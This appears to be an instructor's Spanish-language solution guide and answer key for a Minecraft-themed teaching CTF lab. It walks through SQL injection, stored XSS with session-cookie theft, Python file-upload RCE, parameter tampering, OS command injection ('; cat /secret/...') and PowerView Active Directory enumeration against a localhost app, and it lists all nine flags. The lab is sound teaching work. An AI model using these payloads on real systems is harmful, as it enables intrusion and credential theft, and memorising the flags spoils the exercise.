#  GUÍA DE SOLUCIONES Y WRITEUP OFICIAL: MINECRAFT CTF (DVWA STYLE)

Este documento contiene la metodología de resolución paso a paso de los 9 desafíos del laboratorio **Minecraft CTF**, con los comandos y herramientas exactas de **Kali Linux**, además de la justificación académica de los temas cursados en **6º, 7º y 8º Semestre**.

---

##  DIMENSIÓN 1: OVERWORLD (NIVEL: FÁCIL)

###  Desafío 1: Lingote de Hierro
- **Tema Académico:** *6º Semestre — Esteganografía y Cifrado César (ROT-13) / Base64.*
- **Herramientas Kali Linux:** `exiftool`, `strings`, `base64`, `tr`.
- **Procedimiento de Explotación:**
  1. Descargar el archivo `mapa_cueva.png` desde la interfaz web.
  2. Inspeccionar los metadatos ocultos con `exiftool` o `strings`:
     ```bash
     exiftool mapa_cueva.png
     ```
  3. En la sección `Comment` o `Description` se encuentra la cadena cifrada en Base64:
     `U1lOVHtaVkFSUEVOU0dfVkVCQV9WQVRCR19QM0Y0RV9LMEVfWjFBM1F9`
  4. Decodificar Base64 y aplicar ROT-13 (Cifrado César de 13 desplazamientos):
     ```bash
     echo "U1lOVHtaVkFSUEVOU0dfVkVCQV9WQVRCR19QM0Y0RV9LMEVfWjFBM1F9" | base64 -d | tr 'A-Za-z' 'N-ZA-Mn-za-m'
     ```
- **Bandera Obtenida:**
  `FLAG{MINECRAFT_IRON_INGOT_C3S4R_X0R_M1N3D}`

---

###  Desafío 2: Diamante en Y=-58
- **Tema Académico:** *8º Semestre — Inyección SQL (SQLi).*
- **Herramientas Kali Linux:** Navegador web, Burp Suite, `sqlmap`, `curl`.
- **Procedimiento de Explotación:**
  1. En el buscador de cofres de la aldea, inyectar la carga útil clásica de bypass de autenticación y extracción:
     ```sql
     ' OR 1=1 --
     ```
  2. O mediante `curl` en terminal:
     ```bash
     curl -X POST http://localhost:8080/overworld/diamond/search -d "chest_query=' OR 1=1 --"
     ```
  3. En la respuesta aparece el registro del cofre secreto en la profundidad $Y=-58$ con la bandera.
  4. La consulta aplica además `is_locked = 0`, así que buscar directamente `Herrero` **no**
     devuelve nada. Hay que romper ese filtro con la inyección (el `--` comenta el resto de
     la consulta, incluido el `AND is_locked = 0`):
     ```bash
     # atajo que ya NO funciona:
     curl -X POST http://localhost:8080/overworld/diamond/search -d "chest_query=Herrero"
     ```
- **Bandera Obtenida:**
  `FLAG{MINECRAFT_DIAMOND_SQL1_Y58_UNLOCKED}`

---

###  Desafío 3: Consola de las Cuevas
- **Tema Académico:** *7º Semestre — Enumeración de rutas y validación por allowlist.*
- **Herramientas:** Navegador; opcionalmente `curl` para automatizar la consola.
- **Procedimiento de Explotación:**
  1. Entrar a `/overworld/cueva` desde la tarjeta del desafío 3.
  2. Listar las cinco cuevas con `ls` y revisar el contenido de cada una con `ls <cueva>` y `cat <archivo>`.
  3. Descartar la tablilla falsa de la cueva de hielo y leer los escritos de la bruja para la pista del Nether.
  4. La llave real está en `/cueva/lago-de-lava/llave_ignicion.txt`; el calor de la lava conserva la inscripción.
     ```
     steve@cueva:/cueva$ ls
     bruja/  estalactitas/  hielo/  lago-de-lava/  luminosa/
     steve@cueva:/cueva$ cat /cueva/lago-de-lava/llave_ignicion.txt
     ```
  5. Pegar la bandera en el formulario del desafío 3. La tablilla congelada devuelve un error: es un señuelo.
- **Bandera Obtenida:**
  `FLAG{MINECRAFT_NETHER_PORTAL_METADATA_IGNITED}`
- **Pista para el Nether:**
  `/cueva/bruja/escritos_de_la_bruja.txt` indica que el caldero acepta recetas `.py` y que el secreto del Blaze está en `/secret/blaze_rod.txt`.

---

##  DIMENSIÓN 2: NETHER (NIVEL: MEDIO)

###  Desafío 1: Lingote de Oro
- **Tema Académico:** *8º Semestre — Stored XSS y Robo de Cookies de Sesión.*
- **Herramientas Kali Linux:** Navegador Firefox DevTools, Burp Suite, Netcat (`nc`).
- **¿Qué es XSS?** Cross-Site Scripting (XSS) ocurre cuando una aplicación guarda o muestra
  datos del usuario sin escaparlos. Si en lugar de texto escribes HTML o JavaScript, el
  navegador de otra persona lo interpreta como código. En este reto la nota de la oferta se
  guarda sin sanitizar (**XSS almacenado**) y la abre el Piglin Guard con su sesión privilegiada.
- **Procedimiento de Explotación:**
  1. En el formulario de ofertas de trueque con Piglins, escribe en **Mensaje para el Piglin**
     cualquiera de estos payloads básicos. No hace falta un script complejo: el bot acepta un XSS simple.
     ```html
     <script>alert(1)</script>
     <script>console.log('XSS')</script>
     <img src=x onerror=alert(1)>
     <svg onload=alert(1)>
     <a href="javascript:alert(1)">haz clic</a>
     ```
     El tablón que ve el jugador muestra el payload escapado para no ejecutarlo en su navegador;
     el Guard lo interpreta en el suyo. Usa `console.log('XSS')` si no quieres ventanas emergentes.
  2. Opcional: si quieres emular el robo de cookie completo, este payload envía la sesión del
     Guard al buzón del Bastión:
     ```html
     <script>fetch('/nether/gold/leak?cookie=' + encodeURIComponent(document.cookie));</script>
     ```
  3. El bot simulado del Piglin Guard revisa la oferta y, al encontrar un XSS simple o la
     referencia al endpoint receptor, reproduce la exfiltración: envía su cookie real de tesorero.
  4. Al recargar `/nether`, el tablón muestra el **registro de credenciales comprometidas**
     con el token del Piglin:
     ```
      piglin_gold_vault_token=FLAG{MINECRAFT_PIGLIN_XSS_GOLD_BARTERED}
     ```
  5. Ese token es la bandera. El endpoint de fuga **no** la entrega si solo se consulta:
     ```bash
     curl -s "http://localhost:8080/nether/gold/leak?cookie=piglin"
     # -> "token_verified": false, "flag": null
     ```
     Solo responde con la bandera si los datos exfiltrados contienen el token real.
- **Bandera Obtenida:**
  `FLAG{MINECRAFT_PIGLIN_XSS_GOLD_BARTERED}`

---

###  Desafío 2: Varas de Blaze
- **Tema Académico:** *8º Semestre — Arbitrary File Upload a Ejecución Remota de Código (RCE).*
- **Herramientas Kali Linux:** Editor de texto (`nano`/`vim`), `curl`, Navegador.
- **Procedimiento de Explotación:**
  1. La pista de la cueva de la bruja (Overworld, desafío 3) indica que el secreto está en `/secret/blaze_rod.txt`.
  2. Crear un script en Python llamado `receta_blaze.py` que abra ese archivo y muestre su contenido:
     ```python
     print(open('/secret/blaze_rod.txt').read())
     ```
  3. Subirlo al caldero con el formulario. El caldero ejecuta la receta automáticamente y muestra la salida en la misma tarjeta.
  4. Si se desea reejecutar manualmente:
     ```bash
     curl http://localhost:8080/nether/blaze/execute/receta_blaze.py
     ```
- **Bandera Obtenida:**
  `FLAG{MINECRAFT_BLAZE_ROD_RECETA_EJECUTADA}`

---

###  Desafío 3: Ender Pearl / Ojo de Ender
- **Tema Académico:** *6º Semestre — Principio de Mínimo Privilegio y Parameter Tampering.*
- **Herramientas Kali Linux:** Burp Suite, `curl`.
- **Procedimiento de Explotación:**
  1. El formulario envía por defecto el rol `guest_traveler`.
  2. Modificar el parámetro a un rol de alto privilegio (`ender_master` o `bastion_overlord`):
     ```bash
     curl "http://localhost:8080/nether/pearl/altar?user_role=ender_master"
     ```
  3. El servidor otorgará la bandera de acceso al altar.
- **Bandera Obtenida:**
  `FLAG{MINECRAFT_ENDER_PEARL_PRIV_ESCALATION}`

---

##  DIMENSIÓN 3: THE END (NIVEL: DIFÍCIL - BOSS FINAL)

###  Desafío 1: Cristales del End
- **Tema Académico:** *7º Semestre — Análisis de CVEs y Explotación con Metasploit.*
- **Herramientas Kali Linux:** `curl`, Burp Suite.
- **Procedimiento de Explotación:**
  1. En la consola de ataque a los cristales, enviar el payload que activa la sobrecarga del backdoor emulado:
     ```bash
     curl -X POST http://localhost:8080/end/crystals/exploit -d "exploit_payload=CVE-2026-OVERLOAD_CRYSTALS"
     ```
  2. Los escudos de los 4 cristales caerán detonándolos simultáneamente.
- **Bandera Obtenida:**
  `FLAG{MINECRAFT_END_CRYSTALS_CVE_SHATTERED}`

---

###  Desafío 2: Derrotar al Dragón
- **Tema Académico:** *8º Semestre — Command Injection y RCE en el Sistema Operativo.*
- **Herramientas Kali Linux:** `curl`, Burp Suite.
- **Procedimiento de Explotación:**
  1. El endpoint de disparo evalúa comandos en la consola del servidor.
  2. Concatenar la lectura del archivo secreto del dragón mediante punto y coma `;`:
     ```bash
     curl -X POST http://localhost:8080/end/dragon/damage -d "shot_power=100; cat /secret/dragon_slain.txt"
     ```
  3. La respuesta del servidor ejecutará el comando e imprimirá la bandera.
- **Bandera Obtenida:**
  `FLAG{MINECRAFT_ENDER_DRAGON_SLAIN_COMMAND_INJECTION}`

---

###  Desafío 3: Huevo de Dragón
- **Tema Académico:** *Seguridad en la Nube — Enumeración de Active Directory con PowerView.*
- **Herramientas:** Navegador (consola PowerView simulada) o PowerShell + PowerView en un laboratorio AD real.
- **Contexto:** El Huevo de Dragón fue archivado en el dominio `end.local`. La consola de The End implementa un motor PowerView simulado: no ejecuta PowerShell ni accede al sistema de archivos del contenedor.
- **Procedimiento de Enumeración:**
  1. Confirma el dominio y su controlador:
     ```powershell
     Get-NetDomain
     Get-NetDomainController
     ```
  2. Enumera las cuentas de usuario y revisa sus descripciones:
     ```powershell
     Get-NetUser
     ```
     La cuenta de servicio `svc_backup` describe el vault en `\\END-FS01\vault`.
  3. Confirma qué cuentas pertenecen al grupo que protege el recurso:
     ```powershell
     Get-NetGroupMember -GroupName "End Vault Admins"
     ```
  4. Descubre los recursos compartidos del dominio:
     ```powershell
     Find-DomainShare
     ```
     Aparece `\\END-FS01\vault` como almacén del Huevo de Dragón.
  5. Lee el archivo del Huevo con la ruta UNC completa:
     ```powershell
     Get-Content \\END-FS01\vault\real_dragon_egg.txt
     ```
  6. Alternativas de apoyo: `Get-NetShare -ComputerName END-FS01`, `Get-NetComputer` e `Invoke-UserHunter` para confirmar la sesión de `svc_backup` en el servidor de archivos.
- **Bandera Obtenida:**
  `FLAG{MINECRAFT_FINAL_DRAGON_EGG_VICTORY_GG}`
- **Nota pedagógica:** En un AD real, este flujo demuestra por qué las descripciones de cuentas de servicio no deben exponer rutas internas y por qué los shares deben aplicar mínimo privilegio. La defensa incluye cuentas gMSA, ACLs por grupo, segmentación del servidor de archivos y monitorización de consultas LDAP/SMB.

---

##  PANTALLA FINAL DE VICTORIA
Al ingresar las 9 banderas en sus respectivos desafíos, la barra HUD inferior se completará con los 9 ítems, habrás acumulado la XP de las 9 banderas (+10 XP por cada una) y se redirigirá automáticamente a `http://localhost:8080/victory` con el **Poema del End** y el resumen de competencias aprobadas.

---

#  Criterio de diseño de las pistas

> Este documento es la **guía del instructor** y sí contiene las soluciones completas.
> Las pistas que se muestran dentro de la aplicación web son deliberadamente
> **conceptuales**: describen *qué buscar y por qué*, nunca el payload, el string
> mágico ni el comando listo para pegar.

Razón pedagógica: un alumno que copia la pista no aprende la vulnerabilidad.
Una pista útil le dice en qué dirección pensar y le deja el trabajo de recordar
la sintaxis y construir el payload él mismo.

| Antes (pista = respuesta) | Ahora (pista = concepto) |
|---|---|
| `' OR 1=1 --` listo para pegar | *"Hay dos condiciones unidas por un operador. Haz que la primera siempre sea cierta y comenta el resto"* |
| `<script>fetch('/nether/gold/leak?cookie='+document.cookie)</script>` | *"La nota se renderiza como HTML. El bot ya expone un endpoint receptor en el propio servidor"* |
| `CVE-2026-OVERLOAD_CRYSTALS` | *"El proveedor y el año suelen estar escritos en el propio token de la backdoor"* |
| `Get-Content \\END-FS01\vault\real_dragon_egg.txt` | *"Las descripciones de cuentas de servicio pueden revelar recursos internos; enumera el dominio, sus grupos y sus shares"* |
| `tr 'A-Za-z' 'N-ZA-Mn-za-m'` | *"Un cifrado por sustitución que lleva el nombre de un emperador romano"* |

Los botones ** Ver Código** se mantienen: la divulgación del código fuente vulnerable
es en sí misma una vulnerabilidad real (information disclosure) y forma parte del
reconocimiento que el alumno debe practicar.

---

#  Decisiones pendientes de reunión

Estas ideas se descartaron temporalmente y **están pendientes de decisión del equipo**; no se han implementado.

### 1. Corazones al fallar una bandera
Los corazones del HUD son hoy decorativos (`base.html`, `range(10)` fijo).
- **A favor:** les daría significado real y añadiría tensión.
- **En contra:** penaliza el error, que es justamente el comportamiento que un CTF
  de seguridad debe premiar (probar → fallar → entender → reintentar). Tendería a
  atraer al alumno a adivinar en lote o a rendirse y pedir la solución.
- **Alternativa propuesta:** que los corazones sean un contador de *intentos* no
  consumibles, o que el nivel de XP baje como marca visible al consultar una pista.

### 2. Coste de consultar una pista
Implementado: cada bandera válida otorga **+10 XP** y consultar una pista consume
**20 XP**. La XP es un saldo real y persistente (`student_profiles.xp`) que se
muestra en el HUD junto a la botella de experiencia. Si no hay XP suficiente, la
pista no se desbloquea; una pista ya investigada no vuelve a cobrarse.

### 3. Formato de las banderas
Las 9 banderas usan el envoltorio `FLAG{...}`, idéntico en todas.
- **A favor de quitarlo:** se pierde la señal de "esto es una bandera" al hacer grep.
- **En contra:** el envoltorio es la **garantía de resolubilidad**. Sin un patrón
  reconocible, cuando el alumno deshaga el Base64+ROT13 y obtenga
  `ZVARPENG_VEBA_VABG...` no tiene forma de saber si lo encontró o si le falta un
  trozo. En un entorno académico eso se traduce en tiempo perdido o en la
  conclusión de que el CTF está roto.
- **Alternativa propuesta:** mantener el valor interno `FLAG{...}` para la validación
  pero cambiar la envoltura **visual** en pantalla. Se pierde la señal del grep sin
  arriesgar la resolubilidad.

> Nota: tras la corrección de P3.2 el PNG **ya no contiene la bandera en texto plano**,
> así que `strings` no la delata. El prefijo solo confirma que el alumno acertó, que es
> precisamente el trabajo que debe hacer él.
